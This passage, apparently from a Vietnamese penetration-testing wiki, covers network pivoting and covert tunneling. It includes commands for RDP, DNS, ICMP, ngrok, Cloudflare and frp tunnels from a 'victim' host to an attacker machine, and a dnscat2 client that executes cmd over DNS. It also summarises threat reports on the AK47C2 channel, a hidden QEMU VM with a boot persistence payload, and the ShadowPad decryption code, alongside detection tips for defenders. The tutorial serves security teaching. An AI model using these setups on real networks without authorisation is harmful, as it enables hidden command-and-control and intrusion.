2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Trên máy client, hãy tải **`SocksOverRDP-Plugin.dll`** như sau:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Giờ chúng ta có thể **kết nối** với **nạn nhân** qua **RDP** bằng **`mstsc.exe`**, và sẽ nhận được **thông báo** cho biết **SocksOverRDP plugin đã được bật** và đang **lắng nghe** trên **127.0.0.1:1080**.

**Kết nối** qua **RDP**, sau đó tải lên và thực thi binary `SocksOverRDP-Server.exe` trên máy của nạn nhân:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Bây giờ, hãy xác nhận trên máy của bạn (attacker) rằng cổng 1080 đang lắng nghe:

```
netstat -antb | findstr 1080
```

Giờ bạn có thể dùng [**Proxifier**](https://www.proxifier.com/) để proxy lưu lượng qua cổng đó.<sup>[[26]](#references)</sup>

### Săn tìm trên kênh ảo RDP

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) là một tunnel kênh ảo RDP khác; tên kênh mặc định là `rdp2tcp`, nhưng người vận hành có thể chọn tên khác.<sup>[[56]](#references)</sup> Việc tạo và đóng kênh được ghi lại trong `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` dưới dạng các event ID **132** và **148**. Hãy tìm `rdp2tcp` và các tên kênh hiếm/ngẫu nhiên, sau đó đối chiếu chúng với các kênh dự kiến như `XPSRD`, `cliprdr` và `Microsoft::Windows::RDS::DisplayControl`.<sup>[[58]](#references)</sup>

## Proxy ứng dụng GUI trên Windows

Bạn có thể cấu hình ứng dụng GUI trên Windows để truy cập qua proxy bằng [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Trong **Profile -> Proxy Servers**, thêm IP và cổng của máy chủ SOCKS.\
Trong **Profile -> Proxification Rules**, thêm tên chương trình cần proxy và các kết nối đến những IP bạn muốn proxy; các quy tắc của Proxifier có thể khớp ứng dụng, máy chủ đích và cổng.<sup>[[27]](#references)</sup>

## Tunnel qua proxy NTLM

Công cụ đã đề cập trước đó, **Rpivot**, có thể chuyển tiếp lưu lượng qua proxy xác thực NTLM. **OpenVPN** cũng có thể định tuyến qua proxy này khi được cấu hình với tệp xác thực và phương thức NTLMv2; đây là việc đi qua proxy, không phải vượt qua xác thực proxy.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm xác thực với các proxy NTLM upstream, mở các listener cục bộ và có thể ánh xạ một cổng tunnel cục bộ đến dịch vụ đích; sau đó, client có thể sử dụng cổng cục bộ đó.<sup>[[29]](#references)</sup>\
Ví dụ: chuyển tiếp cổng 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Giờ đây, nếu bạn đặt dịch vụ **SSH** trên máy nạn nhân lắng nghe, chẳng hạn, ở cổng 443, bạn có thể kết nối đến dịch vụ đó qua cổng 2222 của máy kẻ tấn công.<sup>[[29]](#references)</sup>\
Bạn cũng có thể dùng **meterpreter** kết nối đến localhost:443 trong khi máy kẻ tấn công lắng nghe trên cổng 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) là bộ công cụ reverse-proxy .NET của Microsoft. Bạn có thể tìm thấy tại đây: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine tạo một tunnel IPv4 thông qua các truy vấn DNS và sử dụng các giao diện TUN; theo tài liệu, cần có các quyền cần thiết để tạo những giao diện đó ở cả hai đầu.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport có overhead cao hơn TCP trực tiếp và thường chậm; bạn có thể tạo kết nối SSH được nén thông qua tunnel này bằng cách dùng:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Tải xuống tại đây**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 thiết lập một kênh command-and-control được mã hóa qua DNS; các lệnh server và client bên dưới tuân theo cách sử dụng được tài liệu hóa.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Trong PowerShell**

Bạn có thể dùng [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) để chạy dnscat2 client trong PowerShell; README của công cụ này mô tả các tham số `Start-Dnscat2` như bên dưới.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Chuyển tiếp cổng bằng dnscat**

Lệnh tương tác `listen` của Dnscat2 ánh xạ một trình lắng nghe cục bộ đến máy chủ và cổng từ xa.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Thay đổi DNS của proxychains

Proxychains-ng móc nối các kết nối TCP được liên kết động và không thể truyền UDP hoặc ICMP; việc proxy DNS có thể cấu hình, vì vậy hãy kiểm tra `proxychains.conf` đã cài đặt và helper phân giải tên thay vì mặc định một DNS công khai cố định. Các script `proxyresolv` cũ cung cấp `PROXY_DNS_SERVER` để chọn DNS; hãy dùng DNS có thể truy cập từ pivot khi cần phân giải tên nội bộ.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnel trong Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 tùy chỉnh qua DNS TXT / HTTP JSON (AK47C2)

Tác nhân Storm-2603 đã tạo một **C2 hai kênh ("AK47C2")** lợi dụng *chỉ* lưu lượng **DNS** đi ra và **HTTP POST thuần** – hai giao thức hiếm khi bị chặn trên mạng doanh nghiệp.<sup>[[2]](#references)</sup>

1. **Chế độ DNS (AK47DNS)**
   • Tạo SessionID ngẫu nhiên gồm 5 ký tự (ví dụ: `H4T14`).  
   • Thêm tiền tố `1` cho *yêu cầu tác vụ* hoặc `2` cho *kết quả*, rồi nối các trường khác nhau (cờ, SessionID, tên máy tính).  
   • Mỗi trường được **mã hóa XOR bằng khóa ASCII `VHBD@H`**, chuyển sang dạng hex và ghép với nhau bằng dấu chấm – cuối cùng kết thúc bằng tên miền do kẻ tấn công kiểm soát:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Các request sử dụng `DnsQuery()` cho các bản ghi **TXT** (và **MG** dự phòng).  
   • Khi phản hồi vượt quá 0xFF byte, backdoor **chia nhỏ** dữ liệu thành các phần 63 byte và chèn các marker:
     `s<SessionID>t<TOTAL>p<POS>` để máy chủ C2 có thể sắp xếp lại chúng.

2. **Chế độ HTTP (AK47HTTP)**
   • Tạo một JSON envelope:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Toàn bộ blob được XOR-`VHBD@H` → hex → gửi làm body của **`POST /`** với header `Content-Type: text/plain`.
   • Phản hồi dùng cùng cách mã hóa và trường `cmd` được thực thi bằng `cmd.exe /c <command> 2>&1`.

Ghi chú của Blue Team
• Tìm các truy vấn **TXT** bất thường có nhãn đầu tiên là chuỗi hexadecimal dài và luôn kết thúc bằng cùng một domain hiếm.
• Khóa XOR cố định theo sau bởi ASCII-hex rất dễ phát hiện bằng YARA: `6?56484244?484` (`VHBD@H` ở dạng hex).
• Với HTTP, đánh dấu các body của POST `text/plain` chỉ chứa hex và có độ dài là bội số của hai byte.

{{#note}}
Kênh này giữ mỗi nhãn sub-domain trong giới hạn 63 octet của DNS, nhưng việc tuân thủ giao thức không đồng nghĩa với khả năng ẩn mình; domain hiếm, nhãn hexadecimal dài và lưu lượng truy vấn lớn vẫn là các dấu hiệu phát hiện.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans mô tả một tunnel IPv4-over-ICMP sử dụng thiết bị TUN và các yêu cầu ICMP echo; quá trình thiết lập cần đủ quyền để tạo giao diện mạng.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Tải xuống tại đây**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng truyền các kết nối TCP qua ICMP và sử dụng các tùy chọn `-p`, `-l`, `-r` và `-R` bên dưới cho proxy, trình lắng nghe cục bộ, máy chủ đích và cổng đích.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) là một agent giúp đưa các dịch vụ mạng cục bộ lên mạng thông qua tunnel bảo mật; CLI của nó ghi lại các endpoint HTTP, TCP và URL tệp, còn hostname endpoint được in ra có thể thay đổi tùy theo endpoint và tài khoản.<sup>[[39]](#references)</sup>

### Cài đặt

- Tạo tài khoản: https://ngrok.com/signup
- Tải xuống client:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Cách sử dụng cơ bản

**Tài liệu:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent cũng hỗ trợ các tùy chọn authentication và TLS khi cần.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Công khai tệp qua HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP calls

_Hữu ích cho XSS,SSRF,SSTI ..._\
Theo mặc định, standalone agent cung cấp giao diện kiểm tra HTTP tại `http://127.0.0.1:4040`; giao diện này dành cho lưu lượng HTTP.<sup>[[40]](#references)</sup>

#### Tunneling dịch vụ HTTP nội bộ

Tùy chọn `--host-header=rewrite` viết lại header HTTP `Host` upstream để khớp với dịch vụ cục bộ.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Ví dụ cấu hình ngrok.yaml đơn giản

Ví dụ này sử dụng ngrok Agent Config v2; tunnel có tên dùng `proto` và `addr`, và được khởi chạy bằng `ngrok start`.<sup>[[42]](#references)</sup> Cấu hình này mở 3 tunnel:

- 2 TCP
- 1 HTTP với nội dung phục vụ file tĩnh từ /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels có thể xuất bản một dịch vụ cục bộ chạy trên TCP thông qua hạ tầng relay của Microsoft. CLI trên máy chủ tạo một tunnel đi ra, trong khi `devtunnel connect` tái tạo cổng được host trên máy khách; theo mặc định, tunnel yêu cầu xác thực, trừ khi các biện pháp kiểm soát truy cập được nới lỏng có chủ đích.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Điều này có thể công khai RDP qua `*.devtunnels.ms` mà không cần mở listener inbound mới ở ranh giới mạng. Cách này cũng có thể kết hợp với một đường hầm kênh ảo RDP như `rdp2tcp`, biến phiên RDP thành pivot giai đoạn hai cho lưu lượng TCP tùy ý.<sup>[[58]](#references)</sup>

Để săn tìm, hãy đối chiếu việc thực thi Dev Tunnels CLI với lưu lượng DNS/TLS đến `*.devtunnels.ms` và các sự kiện kênh ảo RDP bất thường. Một đường hầm đã xác thực không mặc nhiên là vô hại chỉ vì nó sử dụng relay thuộc Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Connector `cloudflared` của Cloudflare Tunnel thiết lập các kết nối outbound; các ứng dụng được công khai có thể định tuyến HTTP, HTTPS, TCP, SSH và RDP, trong khi quick tunnel được thiết kế cho việc phát triển qua HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Lệnh một dòng cho quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 origin (chế độ legacy)

Cờ legacy `--socks5` cho `cloudflared` biết rằng origin cục bộ sử dụng SOCKS5; cờ này không tạo listener SOCKS5 cục bộ. Với managed tunnel, `originRequest.proxyType: socks` cấu hình cách xử lý origin SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Tunnel bền vững qua DNS

Cấu hình tunnel được quản lý cục bộ sử dụng các khóa `tunnel`, `credentials-file` và `url` viết thường như bên dưới.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Khởi động connector:

```bash
cloudflared tunnel run mytunnel
```

Connector thiết lập các kết nối đi ra và theo mặc định thương lượng QUIC, dự phòng sang HTTP/2; đừng cho rằng mọi triển khai đều dùng TCP/443. Chỉ chạy connector với các quyền cần thiết cho triển khai của bạn.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) là một reverse proxy viết bằng Go, hỗ trợ **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX và XTCP**. XTCP sử dụng kỹ thuật hole punching P2P, với khả năng thành công phụ thuộc vào NAT. Bắt đầu từ **v0.53.0**, công cụ này có thể hoạt động như một **SSH Tunnel Gateway**, cho phép máy chủ đích sử dụng client OpenSSH có sẵn mà không cần binary `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Đường hầm TCP ngược cổ điển

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Sử dụng gateway SSH mới (không có binary frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Lệnh trên công khai cổng **8080** của nạn nhân dưới dạng **attacker_ip:9000** bằng OpenSSH client có sẵn, trong khi `frps` cung cấp gateway.<sup>[[50]](#references)</sup>

## Kết nối ngược UDP có STUN hỗ trợ

Các yêu cầu STUN Binding được gửi từ socket UDP có thể tiết lộ địa chỉ IP và cổng server-reflexive của socket đó, trong khi lưu lượng định kỳ giúp duy trì binding NAT. Máy chủ STUN công khai không phải là relay cho các gói điều khiển tùy ý.<sup>[[60]](#references)</sup> Một thiết kế back-connect được phân tích đã giữ nguyên socket UDP đó để gửi một datagram điều khiển ngắn, sau đó dùng *một kết nối TCP outbound riêng* để tải và thực thi các lệnh sau khi nhận được trigger.<sup>[[59]](#references)</sup>

Để nhận gói UDP từ controller, thiết kế vẫn cần chia sẻ mapping với controller đó và đáp ứng chính sách filtering của NAT. Filtering phụ thuộc vào địa chỉ hoặc cổng có thể chấp nhận các phản hồi từ máy chủ STUN nhưng loại bỏ các gói từ endpoint khác.<sup>[[60]](#references)[[61]](#references)</sup> Đường rendezvous của backdoor được phân tích chưa được xác minh, nên chỉ riêng việc nhận được phản hồi STUN không chứng minh rằng kênh điều khiển có thể truy cập được.<sup>[[59]](#references)</sup> Để xem một giao thức riêng có rendezvous tường minh và phương án dự phòng relay, hãy xem [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Tunnel ẩn dựa trên VM với QEMU

QEMU user-mode networking không yêu cầu quyền root hoặc administrator đối với mạng ảo, và `-netdev user,hostfwd=...` chuyển tiếp các kết nối TCP, UDP hoặc UNIX từ host đến guest.<sup>[[51]](#references)</sup> TrustedSec đã ghi lại một VM Tiny Core QEMU và một nỗ lực tạo reverse SSH tunnel trong một sự cố mà EDR tập trung vào host có thể bỏ sót hoạt động bên trong guest.<sup>[[1]](#references)</sup>

### Lệnh một dòng nhanh

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Lệnh ở trên khởi chạy một máy ảo **Tiny Core Linux** với 256 MiB bộ nhớ và một ảnh đĩa qcow2; ảnh đĩa không phải là đĩa trong RAM.
• Cổng **2222/tcp** trên máy chủ Windows được chuyển tiếp trong suốt đến **22/tcp** bên trong máy ảo.
• Từ góc nhìn của attacker, mục tiêu chỉ đơn giản là mở cổng 2222; mọi gói tin đến cổng này đều được máy chủ SSH đang chạy trong VM xử lý.

### Khởi chạy âm thầm thông qua VBScript

TrustedSec đã quan sát thấy các lần khởi chạy QEMU được điều khiển bằng VBS và các ảnh Tiny Core trong sự cố được trích dẫn ở trên.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Chạy script bằng `cscript.exe //B update.vbs` sẽ giữ cửa sổ ẩn.<sup>[[1]](#references)</sup>

### Persistence trong guest

Sự cố được trích dẫn mô tả cách duy trì persistence trong guest Tiny Core không trạng thái thông qua `/opt/bootlocal.sh` và `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Thả payload vào `/opt/123.out`  
2. Thêm vào cuối `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Thêm `home/tc` và `opt` vào `/opt/filetool.lst` để payload được đóng gói vào `mydata.tgz` khi tắt máy.

### Các cân nhắc về telemetry

• Host vẫn để lộ tiến trình QEMU, ảnh qcow2 và mọi listener được forward từ host.  
• Quét tiến trình chỉ trên host có thể không kiểm tra các tiến trình trong guest, nhưng ảo hóa không đảm bảo né tránh bị phát hiện; telemetry mạng, QEMU và ảnh đĩa vẫn có thể làm lộ hoạt động này.<sup>[[1]](#references)[[51]](#references)</sup>

### Mẹo cho Defender

• Cảnh báo khi phát hiện **binary QEMU/VirtualBox/KVM không mong đợi** trong các đường dẫn mà người dùng có quyền ghi.  
• Chặn các kết nối outbound bắt nguồn từ `qemu-system*.exe`.  
• Tìm các cổng listening hiếm gặp (2222, 10022, …) được bind ngay sau khi QEMU khởi chạy.

## Các relay node IIS/HTTP.sys qua `HttpAddUrl` (ShadowPad)

Check Point mô tả module IIS của ShadowPad biến các web server biên bị xâm nhập thành backdoor và relay node bằng cách bind các tiền tố URL thông qua `HttpAddUrl`.<sup>[[3]](#references)</sup>

Báo cáo tương tự trình bày chi tiết các giá trị mặc định, wildcard listener, giải mã packet, hàng đợi relay và telemetry debug được tóm tắt bên dưới.<sup>[[3]](#references)</sup>

* **Cấu hình mặc định** – nếu JSON config của module bỏ qua các giá trị, module sẽ dùng các giá trị mặc định IIS trông có vẻ hợp lý (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Nhờ vậy, IIS phản hồi lưu lượng bình thường với nhận diện thương hiệu chính xác.
* **Chặn bắt wildcard** – operator cung cấp danh sách tiền tố URL phân tách bằng dấu chấm phẩy (wildcard trong host + path). Module gọi `HttpAddUrl` cho từng mục, để HTTP.sys định tuyến các request khớp đến handler độc hại; request không khớp sẽ chuyển về hành vi IIS bình thường.
* **Packet đầu tiên được mã hóa** – hai byte đầu tiên của request body chứa seed cho PRNG 32-bit tùy chỉnh. Mỗi byte tiếp theo được XOR với keystream được tạo ra trước khi phân tích protocol:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Điều phối relay** – module duy trì hai danh sách: “servers” (nút upstream) và “clients” (implant downstream). Các mục sẽ bị loại nếu không nhận được heartbeat trong khoảng 30 giây. Khi cả hai danh sách đều không rỗng, module ghép server khỏe mạnh đầu tiên với client khỏe mạnh đầu tiên, rồi truyền trực tiếp các byte giữa socket của chúng cho đến khi một bên đóng kết nối.
* **Telemetry gỡ lỗi** – tính năng ghi log tùy chọn lưu lại IP nguồn, IP đích và tổng số byte được chuyển tiếp cho mỗi cặp kết nối. Các nhà điều tra đã dùng những dấu vết này để dựng lại mạng lưới ShadowPad trải rộng qua nhiều nạn nhân.

---

## Các công cụ khác cần kiểm tra

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Ẩn mình trong bóng tối: Tunnel bí mật qua ảo hóa QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Trước ToolShell: Khám phá các chiến dịch ransomware trước đây của Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Bên trong Ink Dragon: Hé lộ mạng lưới relay và hoạt động nội bộ của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README của Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Hướng dẫn tham khảo Nmap: Vượt qua các hạn chế của Firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Hướng dẫn sử dụng ssh của OpenBSD](https://man.openbsd.org/ssh)
- [7] [Hướng dẫn sử dụng sshd_config của OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Ghi chú phát hành OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README của sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting trong Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Tài liệu module socks_proxy của Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Tài liệu module autoroute của Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README của reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README của Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Hướng dẫn bắt đầu nhanh của Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners của Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost của Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README của rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Hướng dẫn sử dụng socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Hướng dẫn sử dụng PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Các tùy chọn dòng lệnh của PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Lệnh netsh interface portproxy của Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README của SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Tài liệu Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Quy tắc Proxification của Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Hướng dẫn sử dụng OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README của YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README của iodine](https://code.kryo.se/iodine/README.html)
- [32] [README của dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README của dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README của proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Tên miền - Triển khai và đặc tả](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README của ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [Giao diện dòng lệnh của ngrok Agent](https://ngrok.com/docs/agent/cli)
- [40] [Giao diện kiểm tra web của ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual host của ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Cấu hình v2 của ngrok Agent](https://ngrok.com/docs/agent/config/v2)
- [43] [Tổng quan về Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Tham số origin của Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Thiết lập Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Tệp cấu hình Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Tham số chạy Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Các khái niệm về frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP của frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Cổng SSH Tunnel của frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Tài liệu về mạng của QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README của wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Kho mã nguồn BOFScale của NetSPI](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: Tailnet được định tuyến qua CDN từ BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Các lệnh CLI của Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle: GhostContainer và tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - Cửa hậu ClingSTUN trên Linux lạm dụng hạ tầng STUN công cộng](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
